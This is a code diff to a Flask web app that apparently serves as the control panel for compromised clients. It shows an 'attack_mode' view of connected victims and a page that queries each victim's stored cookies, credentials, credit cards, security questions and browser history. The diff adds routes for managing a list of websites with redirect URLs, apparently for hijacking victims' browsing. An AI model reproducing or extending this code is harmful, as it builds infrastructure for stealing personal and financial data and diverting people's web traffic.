@@ -9,7 +9,6 @@ from flask_socketio import SocketIO, emit
 import json
 import os
 
-
 login_manager = LoginManager()
 login_manager.init_app(app_flask)
 login_manager.login_view = 'login'
@@ -57,6 +56,29 @@ def attack_mode():
     active_users = [i[0] for i in app.connected_clients]
     return render_template('index2.html', data=data, active_users=active_users)
 
+@app_flask.route('/getBlacklist', methods=['POST'])
+@login_required
+def blacklist():
+    conn = database.getConn()
+    with conn.cursor() as cur:
+        cur.execute('SELECT * FROM BlacklistedWebsites')
+        blacklist = cur.fetchall()
+    return render_template('blacklistedwebsites.html', blacklist=blacklist)
+
+
+@app_flask.route('/blacklist', methods=['POST'])
+@login_required
+def handleBlacklist():
+    url = request.form['url']
+    redirect_url = request.form['redirect_url']
+    addDelete = request.form['add']
+    if(addDelete=='true'):
+        database.store_blacklisted_website(url, redirect_url)
+        return 'add'
+    else:
+        database.delete_blacklisted_website(url,redirect_url)
+        return 'delete'
+
 
 @app_flask.route('/update', methods=['POST'])
 @login_required
@@ -70,8 +92,6 @@ def update():
 def logout():
     logout_user()
     return redirect(url_for('login', next=request.endpoint))
-
-
 
 @app_flask.route('/sendFormIDMappings', methods=['POST'])
 @login_required
@@ -118,7 +138,7 @@ def getinfo():
     with conn.cursor() as cur:
         cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
         record = cur.fetchone()
-        cur.execute('SELECT * FROM Cookies WHERE ClientID = (%s)', (userid,))
+        cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
         cookies = cur.fetchall()
         cur.execute('SELECT * FROM Credentials WHERE CID = (%s)', (userid,))
         credentials = cur.fetchall()
@@ -158,7 +178,7 @@ def getinfo():
     # browser_history = database.get_history(userid)
     # with open(browser_history) as bh:
     #     head = [next(bh) for x in range(10)]
-    # history = open('hist.txt').read().split('\n')
+    #history = open('hist.txt').read().split('\n')
     history = database.get_history(userid).split('\n')
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
                            creditcards=creditcards, questions=questions, history = history, fullbh = fullbh, forms = forms,
